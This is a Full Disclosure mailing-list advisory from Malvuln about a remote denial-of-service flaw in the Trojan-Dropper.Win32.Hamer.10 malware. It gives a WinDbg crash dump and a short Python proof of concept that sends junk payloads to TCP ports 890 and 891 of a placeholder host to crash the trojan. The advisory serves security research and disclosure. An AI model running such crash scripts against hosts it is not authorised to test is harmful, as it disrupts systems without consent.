
Date: Wed, 10 Mar 2021 21:10:57 -0500
From: malvuln <malvuln13@...il.com>
To: fulldisclosure@...lists.org
Subject: [FD] Trojan-Dropper.Win32.Hamer.10 / Remote Floating-point
	Exception DoS

Discovery / credits: Malvuln - malvuln.com (c) 2021
Original source:
https://malvuln.com/advisory/afe4e5219829a286e0b84025b073c259.txt
Contact: malvuln13@...il.com
Media: twitter.com/malvuln

Threat: Trojan-Dropper.Win32.Hamer.10
Vulnerability: Remote Floating-point Exception DoS
Description: Trojan Hamer.10 listens on TCP port 890, after receiving a SYN
packet it also opens up TCP port 891. Sending an arbitrary junk payload to
port 891 results in Floating-point exception and malware crash. Therefore,
to exploit this issue we can send two consecutive packets one to port 890
which will in turn open port 891 .
Type: PE32
MD5: afe4e5219829a286e0b84025b073c259
Vuln ID: MVID-2021-0125
Dropped files: winlogon.exe
ASLR: False
DEP: False
Safe SEH: True
Disclosure: 03/10/2021

Memory Dump:
(3c4.e4c): Unknown exception - code c000008f (first/second chance not
available)
eax=00000000 ebx=00000000 ecx=00000002 edx=00000000 esi=00000003
edi=00000003
eip=7710ed3c esp=0019f238 ebp=0019f3c8 iopl=0         nv up ei pl nz na po
nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
efl=00000202
ntdll!ZwWaitForMultipleObjects+0xc:
7710ed3c c21400          ret     14h

0:000> .ecxr
eax=0019fb38 ebx=00412b44 ecx=00000002 edx=00000000 esi=0019fc1c
edi=026599b0
eip=75eb08f2 esp=0019fb38 ebp=0019fb94 iopl=0         nv up ei pl nz ac po
nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
efl=00000212
KERNELBASE!RaiseException+0x62:
75eb08f2 8b4c2454        mov     ecx,dword ptr [esp+54h]
ss:002b:0019fb8c=3924e764
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for
msvbvm60.dll -

0:000> .exr -1
ExceptionAddress: 75eb08f2 (KERNELBASE!RaiseException+0x00000062)
   ExceptionCode: c000008f
  ExceptionFlags: 00000001
NumberParameters: 2
   Parameter[0]: deadcafe
   Parameter[1]: deadcafe

0:000> !gle
LastErrorValue: (Win32) 0 (0) - The operation completed successfully.
LastStatusValue: (NTSTATUS) 0xc000008a - Indicates the specified resource
type cannot be found in the image file.


0:000> !error  c000008f
Error code: (NTSTATUS) 0xc000008f (3221225615) - {EXCEPTION}
 Floating-point inexact result.

0:000> !analyze -v
*******************************************************************************
*
  *
*                        Exception Analysis
  *
*
  *
*******************************************************************************

*** WARNING: Unable to verify checksum for winlogon.exe
*** ERROR: Module load completed but symbols could not be loaded for
winlogon.exe
Failed calling InternetOpenUrl, GLE=12029

FAULTING_IP:
KERNELBASE!RaiseException+62
75eb08f2 8b4c2454        mov     ecx,dword ptr [esp+54h]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 75eb08f2 (KERNELBASE!RaiseException+0x00000062)
   ExceptionCode: c000008f
  ExceptionFlags: 00000001
NumberParameters: 2
   Parameter[0]: deadcafe
   Parameter[1]: deadcafe

PROCESS_NAME:  winlogon.exe

OVERLAPPED_MODULE: Address regions for 'NapiNSP' and 'wshom.ocx' overlap

ERROR_CODE: (NTSTATUS) 0xc000008f - {EXCEPTION}  Floating-point inexact
result.

EXCEPTION_CODE: (NTSTATUS) 0xc000008f - {EXCEPTION}  Floating-point inexact
result.

EXCEPTION_PARAMETER1:  deadcafe

EXCEPTION_PARAMETER2:  deadcafe

MOD_LIST: <ANALYSIS/>

NTGLOBALFLAG:  0

APPLICATION_VERIFIER_FLAGS:  0

FAULTING_THREAD:  00000e4c

DEFAULT_BUCKET_ID:  STATUS_FLOAT_INEXACT_RESULT

PRIMARY_PROBLEM_CLASS:  STATUS_FLOAT_INEXACT_RESULT

BUGCHECK_STR:  APPLICATION_FAULT_STATUS_FLOAT_INEXACT_RESULT

LAST_CONTROL_TRANSFER:  from 660d0dcf to 75eb08f2

STACK_TEXT:
0019fb94 660d0dcf c000008f 00000001 00000002 KERNELBASE!RaiseException+0x62
WARNING: Stack unwind information not available. Following frames may be
wrong.
0019fbb4 66101d44 00000000 00000000 00000002
msvbvm60!EbGetHandleOfExecutingProject+0x22b3
0019fca0 76eee0bb 00419054 001a012e 0000c216 msvbvm60!ProcCallEngine+0x4ce7
0019fcd0 76ef8849 004043b4 001a012e 0000c216
user32!_InternalCallWinProc+0x2b
0019fcf4 76efb145 0000c216 000002c4 00000001 user32!InternalCallWinProc+0x20
0019fdc4 76ee90dc 004043b4 00000000 0000c216
user32!UserCallWinProcCheckWow+0x1be
0019fe30 76ee38c0 0019fe78 6600a6c8 0019fe50
user32!DispatchMessageWorker+0x4ac
0019fe38 6600a6c8 0019fe50 ffffffff 04091e54 user32!DispatchMessageA+0x10
0019fe78 6600a63f ffffffff 04091e7c 04090000 msvbvm60!_vbaStrToAnsi+0x2f1
0019febc 6600a51d 04091f4c ffffffff 000003c4 msvbvm60!_vbaStrToAnsi+0x268
0019fed8 6600a4e8 04091e78 04091f4c ffffffff msvbvm60!_vbaStrToAnsi+0x146
0019fefc 66003644 ffffffff 0041de90 0041de90 msvbvm60!_vbaStrToAnsi+0x111
00353000 ffffffff 00400000 771b7be0 02651928 msvbvm60!ThunRTMain+0xa0
00000000 00000000 00000000 00000000 00000000 0xffffffff

STACK_COMMAND:  ~0s; .ecxr ; kb

FOLLOWUP_IP:
user32!_InternalCallWinProc+2b
76eee0bb 648025ca0f0000fe and     byte ptr fs:[0FCAh],0FEh

SYMBOL_STACK_INDEX:  3

SYMBOL_NAME:  user32!_InternalCallWinProc+2b

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: user32

IMAGE_NAME:  user32.dll

DEBUG_FLR_IMAGE_TIMESTAMP:  0

FAILURE_BUCKET_ID:
 STATUS_FLOAT_INEXACT_RESULT_c000008f_user32.dll!_InternalCallWinProc

BUCKET_ID:
 APPLICATION_FAULT_STATUS_FLOAT_INEXACT_RESULT_user32!_InternalCallWinProc+2b


Exploit/PoC:
from socket import *
import time

MALWARE_HOST="x.x.x.x"
PORT=890
PAYLOAD="Open port 891 please!\r\n\r\n"

cnt=0
def doit():

    global PORT, cnt

    cnt+=1
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))
    PAYLOAD="A"*710+" HTTP/.1"+"A"*2000+"\r\n\r\n"
    s.send(PAYLOAD)
    s.close()

    time.sleep(1)


    #Recursion check
    if cnt < 2:
       #Increment the vuln port
        PORT += 1
       #BOOM
        doit()
        print("Trojan-Dropper.Win32.Hamer.10 / Remote Floating-point
Exception DoS")
        print("MD5: afe4e5219829a286e0b84025b073c259")
        print("By Malvuln")

if __name__=="__main__":
    doit()


Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and that due
credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit is given to
the author. The author is not responsible for any misuse of the information
contained herein and accepts no responsibility for any damage caused by the
use or misuse of this information. The author prohibits any malicious use
of security related information or exploits by the author or elsewhere. Do
not attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper Malware
handling or the downloading of ANY Malware mentioned on this website or
elsewhere. All content Copyright (c) Malvuln.com (TM).

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/
